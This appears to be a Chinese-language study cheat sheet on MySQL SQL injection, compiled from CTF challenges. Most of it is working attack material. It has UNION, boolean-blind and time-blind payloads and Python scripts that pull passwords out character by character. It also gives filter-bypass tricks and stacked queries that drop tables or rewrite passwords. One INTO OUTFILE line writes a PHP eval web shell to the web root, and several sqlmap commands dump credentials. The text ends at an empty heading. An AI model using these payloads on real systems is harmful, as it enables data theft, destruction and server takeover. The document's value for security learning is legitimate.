# sql注入

##  爆破信息

- mysql5.0以上，有information_schema这个库
- information_schema这个库,MySQL的所有数据库名、表名、字段名都可以从中查询到。

### 爆破表名

```sql
select group_concat(table_name) from information_schema.tables where table_schema=database()
```

- group_concat将结果以一行输出

**注意点：**

使用下面的绕过方法时，要看好对应数据库存储数据库名称的列名，不一定都是`**table_schema=database()**`

#### 绕过informaiton_schema数据库

[https://blog.csdn.net/qq_45521281/article/details/106647880](https://blog.csdn.net/qq_45521281/article/details/106647880)

##### sys.schema_auto_increment_columns

- 该视图的作用就是用来对表自增ID的监控
- 也就是有自增id的表会查出来

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668088704511-02ca692a-3c51-4461-b65f-5542c4ecf803.png#averageHue=%23f5f4f4&clientId=ud5afecba-3310-4&from=paste&height=44&id=uf7965903&originHeight=88&originWidth=1915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35148&status=done&style=none&taskId=u2d64f1ac-fb29-434b-9738-41c8a43a592&title=&width=957.5)

##### sys.schema_table_statistics_with_buffer

- 查询表的统计信息，其中还包括InnoDB缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间
- **没有自增id的表也会查出来**

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668088812219-d977821f-dbb2-4ef2-b0fb-c6beb22945fd.png#averageHue=%23e8e8e7&clientId=ud5afecba-3310-4&from=paste&height=71&id=ua2f29d65&originHeight=142&originWidth=2293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56860&status=done&style=none&taskId=u84de71a1-ba4e-46e1-bbb5-885aa410df3&title=&width=1146.5)

##### [mysql.innodb_table_stats](https://mariadb.com/kb/en/mysqlinnodb_table_stats/)/mysql.innodb_table_index 

- 这两个库也存有库名和表名

### 爆破列名

-  这里假设表名是manage_user，要加单引号，如果报错，那就把Manage_user转成16进制，前面要加0x 

```sql
select group_concat(column_name) from information_schema.columns where table_name='manage_user'
#16进制
select group_concat(column_name) from information_schema.columns where table_name=0x6d616e6167655f75736572
```

#### 无列名查询

[https://zhuanlan.zhihu.com/p/98206699](https://zhuanlan.zhihu.com/p/98206699)

- 原来1,2,3分别对应的是id,username,password

```sql
select 1,2,3 union SELECT * FROM user
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668090362307-376f0571-640b-4540-941d-a4cbf73ac217.png#averageHue=%23edeceb&clientId=ud5afecba-3310-4&from=paste&height=187&id=u92efe8ca&originHeight=374&originWidth=206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25638&status=done&style=none&taskId=u6470b27c-aa1e-4b6d-a7d9-cdaf5823d1b&title=&width=103)                                                     ![查password列](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668090483901-9e3d96a0-2187-4216-84a6-dda2ed780674.png#averageHue=%23efeeed&clientId=ud5afecba-3310-4&from=paste&height=180&id=lxA4i&originHeight=360&originWidth=80&originalType=binary&ratio=1&rotation=0&showTitle=true&size=4762&status=done&style=none&taskId=ufa8d6d3d-9347-4b52-a349-33251ec7b80&title=%E6%9F%A5password%E5%88%97&width=40 "查password列")

- 查出第3列即password列的内容

```sql
select `3` from (select 1,2,3 union select * from user)a;#见上图，查password列
```

- 当反引号被过滤时，使用别名替代

```sql
select b from (select 1,2,3 as b union select * from admin)a;
```

**注意点：这里在爆破信息时，前端有可能只能显示一行，因此要用limit限制，但一行会是1,2,3，所以要limit 1,1**

- 同时查询多个列

```sql
select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;
```

### 爆破具体信息

```sql
select group_concat(m_name,'++++',m_pwd) from manage_user
```

**注意点：**

- 表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。
- 表名、字段名、数据库名等可用反引号 ( ` )，也可以不使用反引号 ，
- 但**如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错**

如果columns的名称是flag?，就需要使用反引号

```sql
select `flag?` from flag
```

### 绕过group_concat

- 用limit绕过

```sql
select table_name from information_schema.tables where table_schema=database() limit 0,1
```

- 索引从0开始，1表示查多少行数据
  ## 

## 内联注释

-  在使用ordey by后发现，不让用union select，可以使用内联注释绕过 

```sql
http://61.147.171.105:62646/view.php?no=-1 union/**/select 1,2,3,4 --+
```


   - 记得用注释把后面的东西注释掉
   - --+不行换# 或者%23
- 查看当前用户权限，如果是root，使用load_file()加载文件，可能可以直接加载出flag.php。 
- 如果上一步没报错，查看网页源代码，就可能获得flag 

## 神奇的union select

- Union select是联合查询，意思就是不管前面的sql语句是否报错，union select的都能执行

### ssrf读取文件

[攻防世界 (xctf.org.cn)](https://adworld.xctf.org.cn/challenges/write-up?hash=c500b9d0-d809-4879-a7a8-5b12da735c57_2)

-  在第四个本应是data的数据位置，构造一个反序列化数据，相当于把这个赋值给url 

```
/view.php?no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

### 偷梁换柱

-  这里我用union select获取信息 

```sql
select username,password from user where username !='flag' and id = '99999' UNION SELECT id,password from user WHERE username='flag' limit 1
```

##  Handler查询

[https://blog.csdn.net/JesseYoung/article/details/40785137](https://blog.csdn.net/JesseYoung/article/details/40785137)

-  当不让用select查询时，可以用Handler 

```
http://61.147.171.105:64583/?inject=1';handler `1919810931114514` open as `a`;handler `a` read next;%23
```

## 数值型注入

-  输入下面的内容使sql恒成立，这里有可能需要用**内联注释** 

```sql
?id=1/**/or/**/1=1
```


-  使sql恒不成立 

```sql
?id=-1/**/or/**/1=2
```


-  结果1显示全部表，结果2为空，则可能存在数值型注入 

py脚本

```python
import requests
 
url = 'http://53aab0c2-b451-4910-a1e0-f15fd9e64b2a.challenge.ctf.show:8080/index.php?id=-1/**/or/**/'
name = ''
 
# 循环45次( 循环次数按照返回的字符串长度自定义)
for i in range(1, 45):
    # 获取当前使用的数据库
    # payload = 'ascii(substr(database()from/**/%d/**/for/**/1))=%d'
    # 获取当前数据库的所有表
    # payload = 'ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%d/**/for/**/1))=%d'
    # 获取flag表的字段
    # payload = 'ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%d/**/for/**/1))=%d'
    # 获取flag表的数据
    payload = 'ascii(substr((select/**/flag/**/from/**/flag)from/**/%d/**/for/**/1))=%d'
    count = 0
    print('正在获取第 %d 个字符' % i)
    # 截取SQL查询结果的每个字符, 并判断字符内容
    for j in range(31, 128):
        result = requests.get(url + payload % (i, j))
 
        if 'If' in result.text:
            name += chr(j)
            print('数据库名/表名/字段名/数据: %s' % name)
            break
 
        # 如果某个字符不存在,则停止程序
        count += 1
        if count >= (128 - 31):
            exit()
```

## like操作符

```sql
SELECT * FROM Persons WHERE City LIKE '%lon%'
```

- %是通配符

### REGEXP 操作符

[MySQL 正则表达式 | 菜鸟教程 (runoob.com)](https://www.runoob.com/mysql/mysql-regexp.html)

-  MySQL中使用 REGEXP 操作符来进行正则表达式匹配 
-  括号中的参数要有单引号 

```sql
select pass from user where pass regexp('ctfshow{')
```

##  or '字符串'

```sql
select username from user where username='' or '1' //后面的where恒成立，会返回所有数据
select username from user where username='' or '1aaaa' //同上
select username from user where username='' or 'aaaa'//or后的条件是不成立的
select username from user where username='' or '0aaaa'//or后的条件是不成立的
```

## right join

### 01

![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216120213-220c2dc1-88c8-44b6-823b-1fe7fb12c3e8.png#averageHue=%23fbf9f8&from=url&id=TJywZ&originHeight=809&originWidth=1133&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 02

![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216592628-7fbea62a-1757-4b3c-ae43-5a06b3d082f2.png#averageHue=%23fcf7f7&from=url&id=uzvu3&originHeight=798&originWidth=1488&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

- **为什么是三行？**首先，前两行必定满足要求，首字母为"c"，因此写上。而：
- ![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216695798-7a37eaac-38f2-48b9-96d8-5b614a6853c7.png#averageHue=%23f5dfdd&from=url&id=Orhzj&originHeight=205&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

不满足情况，但是因为是右连接，所以第三行为 null,null,null,addfg,adsad

### 03

![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216770108-1b4701f7-3131-4d5f-be88-1f98d1582cf9.png#averageHue=%23fdfcfc&from=url&id=sqBqd&originHeight=818&originWidth=1537&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)<br />可以看到，比较的是第一个字符，如果写上regexp('ctf')肯定一个都不匹配，根据右连接的性质，所以为这样。

注：右连接表示user as b里的条目要全<br />![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667216871539-3ddcd0e9-8ccb-423a-86ef-955008ff90fb.png#averageHue=%23fbf9f8&from=url&id=qub5O&originHeight=928&originWidth=1598&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## mysql char函数

- char函数返回字符的ASCII码

```php
select pass from ctfshow_user group by pass having pass regexp('ctfshow{')
select pass from ctfshow_user group by pass having pass regexp(0x63746673686f777b)
select pass from ctfshow_user group by pass having pass regexp(concat(char('c') + char(t)```))
```

- 如果过滤了单引号，那么最后一行的sql变为：先求字符'c'的ASCII码假定为x，由x个true相加获得c字符

## 花式绕过

### with rollup

要求：`if($password==$row['password'])`

-  with rollup会把group by的值再进行排列，并在末尾有一个汇总行，为[null,前面所有值的和]<br />使用group by的输出

使用with rollup

-  这就在最后多了一行密码为空，因此不输密码，即可让该if判断正确 

### 万能密码

```sql
'1 or 1=1 %23
```

### 绕过空格

#### %0a

#### %0c

#### 内联注释/**/

#### 反引号+单引号

```sql
select tableName from `ctfshow_user`where`pass`like'%c%'
```

#### ()

- **任何地方都能用，很好用，首选用这个**

MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格

```sql
select(user())from dual where(1=1)and(2=2)
```

-  例子： 

```sql
(ctfshow_user)where(pass)like'a%'
```


### 绕过#

#### %23

#### where 1=1

-  注意这里要跟在fromxxx表后面

```sql
-1'union%0cselect%0cgroup_concat(password),1,2%0cfrom%0cctfshow_user%0cwhere%0c'1=1
```


   - 显然不能用or取代where

#### or指定查询

```sql
'or(id=26)and'1=1
```

### 绕过单引号'

-  正常情况下，regexp中的参数要有单引号 

```sql
select pass from ctfshow_user group by pass having pass regexp('ctfshow{')
```


-  这个题对单引号进行过滤，用**16进制绕过** 

```sql
select pass from ctfshow_user group by pass having pass regexp(0x63746673686f777b)
```

#### 字符串转16进制

- 也就是用hackbar的16进制编码(hexadecimal encode)

```python
def str2hex(str):
    result = ''
    for x in str:
        result += hex(ord(x))
    return result.replace("0x","")
```

- ord返回字符的ASCII码，10进制，即a会返回97

#### 反引号

```sql
select username from user where username = `admin`
```

### 绕过where

去官网查资料，一大堆[MySQL :: MySQL 5.7 Reference Manual](https://dev.mysql.com/doc/refman/5.7/en/)

- group by having
- right join

### 绕过数字(web 185)

```sql
select true //返回1
```

- 用多个true相加代替数字 

### 绕过substr(mysql)

- left、right
- [LPAD(str,len,padstr)](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_lpad)

Returns the string _**str**_, left-padded with the string _**padstr**_ to a length of _**len**_ characters. If _**str**_ is longer than _**len**_, the return value is shortened to _**len**_ characters.

```sql
select left('str',2)//返回结果为'st'
SELECT LPAD('hi',4,'??');
        -> '??hi'
SELECT LPAD('hi',1,'??');
        -> 'h'
```

## 常用payload

### bool盲注(web174)

#### 步骤

- 抓包获取地址
- 测试得到两种返回值
- if判断条件，if(a>b,1,0)
- 可能有两种情况
  - flag不在当前表中，**二分法**依次爆破表名等信息
  - 在当前表，**直接设置flag中可能出现的值**，regexp

题目对返回结果存在过滤，因此不能直接显示，用脚本返回flag的ascii码值。 

```python
 requests

url = "http://fd909245-0044-46ca-9159-bced302c1766.challenge.ctf.show/api/v4.php?id=1' and "


result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select  password from ctfshow_user4 limit 24,1),{i},1))>{mid},1,0) -- -'
        r = requests.get(url + payload)
        if "admin" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
```

```sql
substr((函数),1,1)//别忘记函数处要有括号
```

#### 注意点

**使用regexp时，通常要和substr一起用**

```python
flag = "123456789abcdefghijklmnopqrstuvwx}yz-{"
result = ''
for x in flag:
	select group_concat(f1ag) from ctfshow_fl0g REGEXP('{result + x}')
```

- 这里这样写显然不合理，假设存在一个值1ad和一个f1ad，那么它匹配的结果就会是1ad
- 所以要一个字符一个字符的判断，使用substr

#### 页面返回值判断

```python
r = requests.post(url, data=data)
if "密码错误" == r.json()['msg']:
    result = result + x
    print(result)
    break
```

r.json()的结果为：<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667271110878-a1471182-3f09-4180-a714-62c80cd4c4b6.png#averageHue=%23292827&clientId=ufbe9e086-7f14-4&from=paste&height=24&id=u0feda798&originHeight=48&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10180&status=done&style=none&taskId=uf927bdfe-04a2-4483-a3ff-60db9eeee39&title=&width=536.5)

#### 常用函数

- ASCII()：返回[字符串](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020)第一个字符的 [ASCII](http://www.nowamagic.net/academy/tag/ASCII) 值，通常和substr一起用
- ord()：返回[字符串](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020)第一个字符的 [ASCII](http://www.nowamagic.net/academy/tag/ASCII) 值
- char()：返回字符的ASCII码值
- left('str',2)：返回'st'

#### 变形1：在文件中获取flag(web189)

```sql
locate('str','abstr')//返回结果为3
```

- 测试得到两种返回值，用二分法查找位置
- 用32-127的ASCII码判断每个字符

### 时间盲注(页面无回显)

- 先首页抓包，看看有没有什么异常的包

and if(条件,1,0)

```python
import requests

url = "http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' and "

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1
        payload = f'1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),{i},1))>{mid},sleep(2),0) -- -'
        try:
            r = requests.get(url + payload, timeout=0.5)
            tail = mid
        except Exception as e:
            head = mid + 1

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
```

#### 时间延迟函数

##### sleep

##### benchmark

```sql
select benchmark(3480500,sha(1)) //对1进行sha操作，重复执行3480500次
```

##### 笛卡尔积

```sql
SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D
//如果上面的延迟太高，可以换成
SELECT count(*) FROM information_schema.columns A, information_schema.columns B,(SELECT count(*) FROM information_schema.columns A limit 1,10) C
```

- 笛卡尔积的结果，第一行会返回A*B*C的结果

**注意点**

```python
r = requests.post(url, data=data, timeout=3)
```

- 这里设置的timeout是连接超时和读取超时共用的
- 连接超时一般设为比 3 的倍数略大的一个数值，因为 TCP 数据包重传窗口的默认大小是 3
- 如果设置小于3，可能读不出数据

#### get和post

```python
#def get(url, params=None, **kwargs) get函数的定义
url = "http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?"
url2 = "http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php"
payload = "id = 1 xxxxx"
payload2={'id' : '1 xxxxx'}

requests.get(url + payload, timeout=1) //相当于url和payload放一起，注意问号的位置
requests.get(url2, params=payload2, timeout=1)//相当于用post的形式提交
```

### into outfile

```
union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'--+
```

```php
union select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/a.php"%23
```

- 如果不能执行，尝试用url编码
  #### 

### md5($string,true)(web 187)

```php
echo md5("ctf", false) //会返回32位的md5值
echo md5("ctf", true)//将以 16 字符长度的原始二进制格式返回
```

#### md5("ctf", true)存在注入

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667141388146-2efcc66a-7d03-4dd5-80c1-08616feea378.png#averageHue=%23f3f3f3&clientId=ucb3da729-db9a-4&from=paste&height=375&id=ube3a9fb6&originHeight=750&originWidth=1773&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63828&status=done&style=none&taskId=u716cd187-5ce1-42de-b215-86bc7f69e95&title=&width=886.5)

```php
echo md5('ffifdyop',true) //返回值为'or'6�]��!r,��b
```

- 将password设置为该值，即可成功绕过

#### mysql弱类型(web 188)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667202140453-3c7ba353-ea55-4107-8ac5-8bc323eddca7.png#averageHue=%23f2f2f2&clientId=u31d3c051-600c-4&from=paste&height=513&id=uc8539687&originHeight=1025&originWidth=1504&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90079&status=done&style=none&taskId=u3cd2b5bd-6a27-4022-af44-277eb440350&title=&width=752)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667202303252-f3d1f173-0e30-40a8-aa94-b43acc0c3771.png#averageHue=%23efeeee&clientId=u31d3c051-600c-4&from=paste&height=134&id=u748a61bd&originHeight=268&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28155&status=done&style=none&taskId=ubd00a6e3-63d0-4fa7-a82b-91610e92ae4&title=&width=275)

```sql
select pass from ctfshow_user where username = 0 //当没有单引号时，0会和字符匹配，查询出id从1-5
select pass from ctfshow_user where username = 4 //查询出id为6的数据 
```

### 堆叠注入

-  把一堆语句放在一起(可以使用在Mysql命令行中使用的语句)<br />**mysql命令中的是 show databases; 而Mysql函数是 database()** 

```
http://61.147.171.105:64583/?inject=1' ;show databases; %23
```

#### 显示所有表

```
http://61.147.171.105:64583/?inject=1' ;show tables; %23
```

#### 显示所有列

-  当表名是字符串时，操作要加反引号` 

```
http://61.147.171.105:64583/?inject=1';show columns from `1919810931114514`;%23
```

#### 更新密码

```sql
;update`ctfshow_user`set`pass`='123';
```

#### handler查询

- select如果被过滤了，可以用这个查询

#### select(1) web 196

![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667304239455-882dd8d7-6ae7-4f40-96a6-565029701d96.png?x-oss-process=image%2Fresize%2Cw_1500%2Climit_0#averageHue=%23f1f0f0&from=url&id=xnwrR&originHeight=889&originWidth=1500&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

- 将 1;select(1) 放到 sql 语句中会变成这样：

```
select password from user where username = 1;select 1;
```

- 这个是啥也不输出的。
- 思考之后，发现其实可以这样理解，把上述sql语句理解成如下：

```
select password from user where username = 1 union select 1;
```

- 这样的话，sql语句返回1，然后直接和输入的password作比较，就可以理解了。

![](https://cdn.nlark.com/yuque/0/2022/png/29080821/1667304495290-966f11d4-45db-4e85-a93f-6dfb4deb7d88.png#averageHue=%23efedec&from=url&id=rMTB0&originHeight=636&originWidth=1511&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

- 只要红框1与红框2中的东西相同，就可以输出flag。事实证明的确是这样的。

**非常好用的payload**

```sql
用户名：0;show tables;
密码： ctfshow_user
```

#### drop table

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667390341382-ddc7291c-802d-49c4-ad9a-68185f3bc1a7.png#averageHue=%23f6f6f6&clientId=u4ab71d4f-06cb-4&from=paste&height=616&id=uf797846f&originHeight=1232&originWidth=2088&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101937&status=done&style=none&taskId=u007f16ff-0686-445a-862f-f7b6059045f&title=&width=1044)<br />设置username为：

```php
0;drop table ctfshow_user;create table ctfshow_user(`username` varchar(100),`pass` varchar(100));
insert ctfshow_user(`username`,`pass`) value(1,2)
```

#### 交换用户名、密码

- 单引号过滤了，用反引号代替

```sql
alter table ctfshow_user change `pass` `pass2` varchar(100);
alter table ctfshow_user change `pass2` `username` varchar(100);
alter table ctfshow_user change `username` `pass` varchar(100);
```

##### text替换varchar

- 如果题目对 ()进行了过滤，那么将上面的varchar 类型改为text

```sql
alter table ctfshow_user change `pass` `pass2` text;
alter table ctfshow_user change `pass2` `username` text;
alter table ctfshow_user change `username` `pass` text;
```

### 图片注入

[https://zhuanlan.zhihu.com/p/471136978](https://zhuanlan.zhihu.com/p/471136978)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001707243-03128d2f-51c0-4a2c-8468-4c629582797c.png#averageHue=%23f8f8f7&clientId=u28f216fd-6910-4&from=paste&height=226&id=u9772cac5&originHeight=452&originWidth=1411&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50148&status=done&style=none&taskId=u62b04f79-fd92-4c79-8597-c4626462a8b&title=&width=705.5)

- 这里构造一个payload.bin的文件上传

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001840409-dd1e9c50-9937-4166-9c8c-d88937386212.png#averageHue=%23fcfcfc&clientId=u28f216fd-6910-4&from=paste&height=248&id=BJxNO&originHeight=496&originWidth=1869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46568&status=done&style=none&taskId=ue2558234-8a11-4215-9b6e-5cfdd35e421&title=&width=934.5)

- 根据返回信息，猜测filetype可能存在注入点

![9df0b2e22e10825b86652215c85d292.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001899790-1f154485-316d-4957-a5cb-33d9ea29e824.png#averageHue=%23242221&clientId=u28f216fd-6910-4&from=paste&height=329&id=u4c4843a4&originHeight=657&originWidth=1842&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87391&status=done&style=none&taskId=u21e5e3c9-66b8-49ef-9b71-c268edc82a2&title=&width=921)

- 源代码中，这里通过file方法会获取文件的filetype并存到数据库中
- 因此构造sql语句，可以闭合下面的insert语句，进行堆叠注入

![29d7f5eea86063a7aa55a579ff0e20c.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001951695-b0bd80a3-6866-4088-a37c-f06638c3fe79.png#averageHue=%23352321&clientId=u28f216fd-6910-4&from=paste&height=70&id=u6841a039&originHeight=140&originWidth=2809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35346&status=done&style=none&taskId=ub249bd91-481e-43eb-9835-bfa2ce6e67b&title=&width=1404.5)
### 

## <br />


### 
### 
### 

### 预处理语句

[https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450](https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450)

#### 预处理语句

```sql
SET @tn = 'hahaha';  //存储表名
SET @sql = concat('select * from ', @tn);  //存储SQL语句-->这里的sql语句经过测试得是select，不能是show开头
PREPARE name from @sql;   //预定义SQL语句
EXECUTE name;  //执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句
```

#### concat 绕过一切

方法1：按照上面的标准写法，char(115,101,108,101,99,116) = select

```sql
1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');
PREPARE st from @sqli;
EXECUTE st;#
```

方法2：

```sql
1';PREPARE st from concat('s','elect', ' * from `1919810931114514` ');EXECUTE st;#

//也可以直接

1';PREPARE st from select * from user;EXECUTE st;#
```

#### 16进制

```sql
1';PREPARE st from concat('s','elect', ' * from `1919810931114514` ');EXECUTE st;#

//等价于下面的语句

1';PREPARE st from 0x636f6e636174282773272c27656c656374272c2027202a2066726f6d20603139313938313039333131313435313460202729;
EXECUTE st;#
```

- 记得要对编码的结果前加0x
  ### 
  ### 
  ### 
  ### 
  ### 
  ### 

### sqlmap

```shell
//如果不知道id，随便写一个
sqlmap -u "url/?id=xx" --current-db
//假设数据库名是cyber
sqlmap -u "url/?id=xx" -D cyder --tables
//假设表明是cyber
sqlmap -u "url/?id=xx" -D cyder -T cyber
sqlmap -u "url/?id=xx" -T cyber --columns
//假设有一列名是pw,要给列名加双引号，--dump显示具体信息
sqlmap -u "url/?id=xx" -C "pw" --dump

--batch                             测试过程中， 执行所有默认配置
```

#### --referer和--user-agent

```shell
--user-agent 指定agent
--referer 绕过referer检查
```

#### --data

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667528516836-c750262e-8288-48ba-8176-4be6106cd230.png#averageHue=%23f1f1f1&clientId=u263e212a-c22a-4&from=paste&height=230&id=u1d4e59c9&originHeight=460&originWidth=1005&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27195&status=done&style=none&taskId=u2581948d-bb42-421f-bf26-045c6f5c461&title=&width=502.5)<br />**注意点：url通过抓包获取，如果抓包是get传参，改成用post的话，那api后要有/。**

```shell
sqlmap -u "xxx/api/" --data=数据 通过POST发送数据字符串，例如: --data="id=1"
```

#### --method

**注意点**

- put可能是大写PUT
- 要加上–headers="Content-Type: text/plain"
- 如果/api/没扫出来，那么尝试/api/index.php
- url后面是/index.php时 sqlmap会附加测试参数，是/时sqlmap认为是目录，不附加测试参数

```shell
sqlmap -u "xxx/api/" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump
```

##### http put vs post

[https://cloud.tencent.com/developer/news/39873](https://cloud.tencent.com/developer/news/39873)

- 使用PUT时，必须明确知道要操作的对象，如果对象不存在，创建对象；如果对象存在，则**全部替换目标对象**。
- put是idempotent（幂等的，多次提交，结果相同）
- POST既可以创建对象，也可以修改对象。但用POST创建对象时，之前并不知道要操作的对象，由HTTP服务器为新创建的对象生成一个唯一的URI；
- 使用POST修改已存在的对象时，一般只是**修改目标对象的部分内容**

#### --cookie

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667531803618-3cee2be8-a6c2-4e8f-9d0c-d2f1f0aa7576.png#averageHue=%23e7d8c5&clientId=u263e212a-c22a-4&from=paste&height=511&id=u0edcf33c&originHeight=1022&originWidth=2592&originalType=binary&ratio=1&rotation=0&showTitle=false&size=218471&status=done&style=none&taskId=u3d343c57-6e8e-4e35-99cc-a865d12e866&title=&width=1296)

```shell
sqlmap -u "xxx" --cookie="PHPSESSID=f4jg1nq14qk0b2lt4g7be6c490; ctfshow=fcfcd45b23c5d083c62dee06dd52f859"
```

#### 鉴权

![da07003d5ccb0da9cf3762b31e9137d.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/29405061/1667533394022-4b912c2d-5ed8-468e-819a-17e948ffdea7.jpeg#averageHue=%23f6f5f5&clientId=u263e212a-c22a-4&from=paste&height=237&id=ueab8eff2&originHeight=473&originWidth=1519&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75805&status=done&style=none&taskId=uf9985609-6f45-4a08-827a-51a8b9cf63a&title=&width=759.5)<br />![c541ae9ec07317a1941ad2a3e9cd903.jpg](https://cdn.nlark.com/yuque/0/2022/jpeg/29405061/1667533400543-47bc8a35-ae15-4629-a139-84a565308874.jpeg#averageHue=%23f6f6f6&clientId=u263e212a-c22a-4&from=paste&height=241&id=uff5dadd7&originHeight=482&originWidth=1625&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73312&status=done&style=none&taskId=u52639826-f34c-40c0-b931-802b380bbf5&title=&width=812.5)

- burp抓包可知，在访问目标网址前，会先访问gettoken.php

```shell
--safe-url 设置在测试目标地址前访问的安全链接
 --safe-freq 设置两次注入测试前访问安全链接的次数

sqlmap.py -u "xxx" --safe-url="xxxx/getToken.php" --safe-freq=1
```

#### 闭合sql

![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667547922387-d4a4ee72-5d95-4998-85e2-7ad0349eb93e.png#averageHue=%23f0f0f0&clientId=u9b62095b-5164-4&from=paste&height=89&id=u0f6b7b0e&originHeight=177&originWidth=1483&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19214&status=done&style=none&taskId=u7155534f-0738-454c-bea8-9c53d294e75&title=&width=741.5)

- 这里需要闭合前面的单引号和括号

```shell
sqlmap -u http://128a0fb2-4799-4a88-82e6-02ee85211fd1.challenge.ctf.show/api/index.php --method=PUT --data="id=1" --referer=ctf.show  --headers="Content-Type: text/plain" --cookie="PHPSESSID=hbbuo92v17defcf4d01d198kol" --safe-url=http://128a0fb2-4799-4a88-82e6-02ee85211fd1.challenge.ctf.show/api/getToken.php --safe-freq=1 --user-agent="sqlmap" --prefix="')" --suffix="#" --current-db -D "ctfshow_web" -T "ctfshow_flaxc" -C "flagv" --dump
//--prefix="')" 添加前缀 
//--suffix="#" 添加后缀
```

#### --tamper

